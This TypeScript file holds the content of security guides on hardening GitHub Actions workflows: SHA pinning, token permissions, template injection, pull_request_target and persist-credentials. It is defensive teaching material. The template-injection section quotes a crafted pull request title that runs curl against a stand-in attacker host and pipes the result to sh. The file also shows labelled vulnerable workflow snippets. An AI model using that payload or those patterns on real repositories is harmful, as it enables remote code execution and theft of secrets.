/**
 * The /learn guides: one page per hardening habit Anchorflow checks. Each is a
 * real answer to a real search ("pin github actions to sha", "github actions
 * template injection", …), not a doorway page: it explains the risk, shows the
 * before/after, and says exactly what Anchorflow does and does not check.
 */
export interface LearnSection {
  heading: string;
  body: string[];
  code?: string;
}

export interface LearnTopic {
  slug: string;
  /** Short label for nav and the guide index. */
  label: string;
  title: string;
  description: string;
  intro: string;
  sections: LearnSection[];
  /** What the Anchorflow audit does for this habit, in one paragraph. */
  inAnchorflow: string;
}

export const LEARN_TOPICS: LearnTopic[] = [
  {
    slug: "pin-github-actions-to-commit-sha",
    label: "Pin actions to commit SHAs",
    title: "How to pin GitHub Actions to a commit SHA",
    description:
      "Why a tag like @v4 can change under you, how to pin every action to a full commit SHA, and how to keep Dependabot updates working.",
    intro:
      "A uses: line that names a tag runs whatever commit that tag points at when the job starts. Pinning replaces the tag with the full 40-character commit SHA, so the code that runs is the code you reviewed.",
    sections: [
      {
        heading: "Why tags are not enough",
        body: [
          "Tags in Git are pointers. Anyone with push access to an action's repository can move @v4, or a version tag like @v4.2.0, to a different commit, and many maintainers move the major tag on every release by design. If an action's repository is compromised, moving its tags is the fastest way to reach every workflow that uses it.",
          "A commit SHA cannot be moved. Pinning to the full SHA is the mitigation GitHub's own security hardening guide recommends for third-party actions.",
        ],
      },
      {
        heading: "The pinned format",
        body: [
          "Keep the tag you started from as a trailing comment. Dependabot's github-actions ecosystem and Renovate both read that comment, so they keep opening update pull requests that bump the SHA and the comment together.",
        ],
        code: `# before: a tag that can be moved
- uses: actions/checkout@v4

# after: the commit v4 points at today, with the tag kept as a comment
- uses: actions/checkout@<40-character commit SHA>  # v4`,
      },
      {
        heading: "Finding the right SHA",
        body: [
          "Look the tag up in the action's repository. For an annotated tag the tag object has its own SHA, which is not the commit; you need the commit it points at (the peeled ref). git ls-remote shows both, and the line ending in ^{} is the commit.",
        ],
        code: `git ls-remote https://github.com/actions/checkout "refs/tags/v4*"
# <tag-object-sha>   refs/tags/v4
# <commit-sha>       refs/tags/v4^{}   <- pin to this one`,
      },
      {
        heading: "What pinning does not do",
        body: [
          "A pin freezes code; it does not vet it. You still choose which actions to trust, and a pinned action can still fetch and run other code at runtime. Re-check pins when you update them, and prefer actions from publishers you would trust with your token.",
        ],
      },
    ],
    inAnchorflow:
      "Anchorflow lists every uses: in your workflow, marks moving refs (branches, bare majors) and plain tags as not pinned, and on request resolves each one to its commit with read-only requests from your browser. It rewrites only the uses: values, keeps every comment and blank line, adds the tag comment, and gives each pin a receipt with the API calls and a git ls-remote line to check it by hand.",
  },
  {
    slug: "github-token-permissions",
    label: "Least-privilege GITHUB_TOKEN",
    title: "GITHUB_TOKEN permissions: how to set least privilege",
    description:
      "How the permissions block works at workflow and job level, why unset permissions are risky, and a least-privilege pattern you can copy.",
    intro:
      "Every job gets a GITHUB_TOKEN. Its scopes come from the permissions block, and if you never write one, from the repository's default setting, which on older repositories and many organisations is read and write for everything.",
    sections: [
      {
        heading: "How the grant is decided",
        body: [
          "A top-level permissions block applies to every job. A job's own block replaces it for that job: scopes you do not list in the job block are set to none. Writing permissions: {} at the top removes every scope, so each job has to ask for what it needs.",
        ],
      },
      {
        heading: "A least-privilege pattern",
        body: [
          "Start from nothing and grant per job. Only the job that publishes gets write access, and only to the scope it writes.",
        ],
        code: `permissions: {}

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@<sha>  # v4

  release:
    runs-on: ubuntu-latest
    permissions:
      contents: write   # this job pushes the release tag
    steps:
      - uses: actions/checkout@<sha>  # v4`,
      },
      {
        heading: "Common over-grants",
        body: [
          "permissions: write-all at the top or on a job. No permissions block at all, so the repository default applies. A write scope on a job whose steps only read. id-token: write on a job with no step that requests an OIDC token. Each one widens what injected code could do with the token.",
        ],
      },
    ],
    inAnchorflow:
      "Anchorflow builds a grant table for every job, showing which scopes are set by the top-level block and which by the job's own block, and flags write-all, unset permissions, write scopes that no step needs and unused id-token: write. Each finding names the job and the line and says what to change.",
  },
  {
    slug: "github-actions-template-injection",
    label: "Template injection",
    title: "Template injection in GitHub Actions, and the one-line fix",
    description:
      "How ${{ github.event.* }} in run, with or if turns a pull request title into code, which fields are attacker-controlled, and how to fix it with env.",
    intro:
      "GitHub replaces ${{ }} expressions with their values before a step runs. When the value is text someone outside your team wrote, such as a pull request title or a branch name, it is pasted straight into your script.",
    sections: [
      {
        heading: "Which values are untrusted",
        body: [
          "Anything a contributor controls: pull request and issue titles and bodies, comment bodies, review bodies, commit messages, head branch names, labels on pull requests from forks, and author names and emails. A title like a\"; curl attacker.example | sh; echo \" is valid text and becomes valid shell.",
        ],
      },
      {
        heading: "The fix",
        body: [
          "Pass the value through an environment variable and read it in the script. The shell treats an environment variable as data and never re-parses it as code.",
        ],
        code: `# vulnerable: the title is pasted into the script
- run: echo "\${{ github.event.pull_request.title }}"

# safe: the title arrives as data
- run: echo "$TITLE"
  env:
    TITLE: \${{ github.event.pull_request.title }}`,
      },
      {
        heading: "It is not only run:",
        body: [
          "The same expansion happens in with: inputs, so actions/github-script's script input is just as exposed, and in if: conditions. Treat every ${{ }} that touches github.event as a place to check.",
        ],
      },
    ],
    inAnchorflow:
      "Anchorflow tokenises every ${{ }} expression in run, with and if, including nested function arguments and concatenations, matches it against the untrusted github.event fields and flags each sink with its line and the env-based fix.",
  },
  {
    slug: "pull-request-target-security",
    label: "pull_request_target",
    title: "pull_request_target and workflow_run: running untrusted code safely",
    description:
      "Why pull_request_target runs with a write token and secrets, how checking out the pull request's head turns that into code execution, and what to do instead.",
    intro:
      "pull_request runs fork pull requests with a read-only token and no secrets. pull_request_target runs in the context of the base repository, with its secrets and a token that can write. That is useful for labelling or commenting, and dangerous if the job runs the contributor's code.",
    sections: [
      {
        heading: "Where it goes wrong",
        body: [
          "The risky pattern is a pull_request_target (or workflow_run) job that checks out the pull request's head and then builds, installs or tests it. The contributor's build scripts then run with your secrets and a write token.",
        ],
        code: `on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>  # v4
        with:
          ref: \${{ github.event.pull_request.head.sha }}   # untrusted code
      - run: npm ci && npm test                          # runs it with your token`,
      },
      {
        heading: "Safer shapes",
        body: [
          "Run tests on pull_request, which has no secrets and a read-only token for forks. Keep pull_request_target for jobs that never check out or execute the pull request's code, such as labelling. If you must use the results of an untrusted build, split it: build on pull_request, upload an artifact, and handle it in a separate workflow that treats the artifact as data.",
        ],
      },
    ],
    inAnchorflow:
      "Anchorflow flags a pull_request_target or workflow_run job that holds a write token, and calls it out as critical when that job checks out untrusted pull request code. It does not run your workflow or follow reusable workflows across repositories.",
  },
  {
    slug: "checkout-persist-credentials",
    label: "persist-credentials",
    title: "actions/checkout persist-credentials: why to turn it off",
    description:
      "actions/checkout leaves the job's token in .git/config by default. Here is when that matters and how to switch it off.",
    intro:
      "By default actions/checkout writes the job's token into the repository's .git/config so later git commands are authenticated. Every later step in the job, including third-party actions and scripts from dependencies, can read it from there.",
    sections: [
      {
        heading: "Switch it off unless a later step pushes",
        body: [
          "Most jobs only read the code. Set persist-credentials: false on checkout, and pass a token explicitly to the one step that needs to push.",
        ],
        code: `- uses: actions/checkout@<sha>  # v4
  with:
    persist-credentials: false`,
      },
      {
        heading: "Why it matters with artifacts",
        body: [
          "A job that uploads its workspace as an artifact can upload .git/config with it. Turning persistence off keeps the token out of anything the job publishes.",
        ],
      },
    ],
    inAnchorflow:
      "Anchorflow flags actions/checkout steps that set persist-credentials: true, and steps that leave the default in jobs with an elevated trigger or untrusted input, with the job and line.",
  },
  {
    slug: "verify-pinned-action-sha",
    label: "Verify a pinned SHA",
    title: "How to verify a pinned GitHub Action SHA yourself",
    description:
      "Check that a pinned SHA really is the commit a tag points at, using git ls-remote or the GitHub API, without trusting any tool.",
    intro:
      "A pin is only as good as the SHA in it. Before you merge a pull request that pins actions, you can check each SHA against the tag in its comment in a few seconds.",
    sections: [
      {
        heading: "With git",
        body: [
          "git ls-remote asks the repository directly. For annotated tags, the line ending in ^{} is the commit the tag points at; that is the SHA the pin should contain.",
        ],
        code: `git ls-remote https://github.com/actions/setup-node "refs/tags/v4*"`,
      },
      {
        heading: "With the GitHub API",
        body: [
          "GET /repos/{owner}/{repo}/git/ref/tags/{tag} returns the object the tag points at. If its type is tag (an annotated tag), follow it with GET /repos/{owner}/{repo}/git/tags/{sha} to reach the commit.",
        ],
        code: `curl -s https://api.github.com/repos/actions/setup-node/git/ref/tags/v4`,
      },
      {
        heading: "Remember it is a snapshot",
        body: [
          "The SHA is correct for the moment you looked. The tag can move later; that is the point of pinning. Re-resolve when you deliberately update, and let Dependabot or Renovate propose the bumps.",
        ],
      },
    ],
    inAnchorflow:
      "Every pin Anchorflow makes comes with its receipt: each API endpoint it called in order, the tag-object and commit SHAs along the way, and the git ls-remote line to reproduce it. Copy the line, run it, and compare.",
  },
];

export function topicBySlug(slug: string): LearnTopic | undefined {
  return LEARN_TOPICS.find((t) => t.slug === slug);
}
